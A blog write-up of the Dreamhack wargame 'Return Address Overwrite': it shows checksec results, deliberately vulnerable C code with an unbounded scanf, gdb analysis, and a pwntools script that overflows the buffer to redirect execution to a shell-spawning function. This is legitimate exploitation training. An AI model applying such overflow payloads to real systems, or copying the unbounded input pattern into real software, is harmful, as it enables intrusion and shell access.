---
layout: post
title: "[dreamhack] Return Address Overwrite"
comments: true
category: wargame
---

## Checksec
First, let's check mitigation.
```
Arch:   amd64-64-little
RELRO:  Partial RELRO
Stack:  No canary found
NX:     NX enabled
PIE:    No PIE(0x400000)
```
PIE turns off, so code section's address is fixed value.

***

## C code
```cpp
#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```
get_shell() function executes '/bin/sh'.<br />
If we can exectes get_shell() func, then we can get shell.<br />

In main, there is char buf, and it receive input by scanf.<br />
scanf function doesn't check size of input, so we can make bof.<br />

***

## Debug binary
![Description](/assets/img/Return-Address-Overwrite/get_shell.png)
In gdb, we can disassemble get_shell() func.<br />
This binary's PIE turns off, so get_shell() func's address has fixed value of 0x4006aa.v
![Description](/assets/img/Return-Address-Overwrite/main.png)
In main, scanf has two arguments, "%s" and buf.<br />
And two arguments are set to rdi and rsi before call scanf.<br />
[rbp-0x30] is set to rsi(code: 0x40070b and 0x40070f), and we can know buf's address by this.


***

## Ex code

We can send input to buf more than buf's size, and overwrite return address of main.<br />
If we overwrite return address with get_shell() func address, then after main func end, '/bin/sh' will execute.<br />
buf's distance to $rbp is 0x30, and there is sfp(8bytes) between $rbp and return address.<br />
So we have to send input of 0x38 dummy bytes + get_shell addr.<br />

```python
from pwn import *

context.log_level = 'debug'

r = process('./rao')
#r = remote('host3.dreamhack.games', 13579)

get_shell_addr = 0x4006aa

payload = b'A' * 0x30           #Overwite from buf to $rbp
payload += b'B' * 0x8           #Overwrite SFP
payload += p64(get_shell_addr)  #Overwrite main's RA

r.sendlineafter(b'Input: ', payload)

r.interactive()
```